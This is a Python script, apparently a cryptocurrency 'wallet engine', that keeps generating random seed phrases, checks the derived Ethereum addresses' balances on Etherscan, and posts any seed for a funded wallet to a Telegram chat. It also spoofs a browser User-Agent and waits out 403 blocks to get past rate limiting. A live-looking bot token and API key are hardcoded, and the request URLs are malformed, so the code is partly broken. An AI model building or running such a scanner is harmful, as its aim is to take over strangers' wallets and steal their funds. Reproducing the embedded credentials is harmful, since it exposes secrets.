import requests
import time
import os
import logging
from threading import Thread
from flask import Flask
from eth_account import Account
from mnemonic import Mnemonic

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class WalletEngine:
    def __init__(self):
        self.tg_token = "8794852622:AAH9p2HSno2YPPIssRE5En0Ii2Wv84E8_pA" 
        self.chat_id = "391754544"
        self.eth_key = "8RTIQAK1ZZUNC2JNZ5EM13BCRHVZ26UA9R"
        self.total_checked = 0
        self.mnemo = Mnemonic("english")
        Account.enable_unaudited_hdwallet_features()
        
        # استفاده از Session برای حفظ کوکی‌ها و شبیه‌سازی دقیق مرورگر
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://etherscan.io'
        })

    def _notify(self, text):
        url = f"https://telegram.org{self.tg_token}/sendMessage"
        try:
            self.session.post(url, json={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=15)
        except: pass

    def scanner_loop(self):
        logger.info("🚀 ANTI-403 MODE STARTED")
        while True:
            try:
                words = self.mnemo.generate(strength=128)
                acc = Account.from_mnemonic(words)
                
                # آدرس کامل و صحیح
                url = f"https://etherscan.io{acc.address}&tag=latest&apikey={self.eth_key}"
                
                resp = self.session.get(url, timeout=20)
                
                if resp.status_code == 200:
                    data = resp.json()
                    # بررسی اینکه آیا خود API خطا داده یا نه
                    if data.get('status') == '1':
                        bal = int(data.get('result', 0))
                        if bal > 0:
                            self._notify(f"💎 FOUND!\n`{words}`\n{acc.address}")
                    
                    self.total_checked += 1
                    if self.total_checked % 20 == 0:
                        logger.info(f"Progress: {self.total_checked} wallets checked.")
                    
                    # وقفه 3 ثانیه‌ای برای جلوگیری از بلاک مجدد
                    time.sleep(3) 

                elif resp.status_code == 403:
                    logger.warning("⚠️ Access Denied (403). Server is blocking us. Waiting 2 minutes...")
                    time.sleep(120) # اگر بلاک شد، 2 دقیقه صبر کن
                else:
                    logger.error(f"Server returned status: {resp.status_code}")
                    time.sleep(60)

            except Exception as e:
                logger.error(f"Error: {e}")
                time.sleep(30)

engine = WalletEngine()
app = Flask(__name__)

@app.route('/')
def home():
    return {"status": "running", "checked": engine.total_checked}, 200

if __name__ == "__main__":
    Thread(target=engine.scanner_loop, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
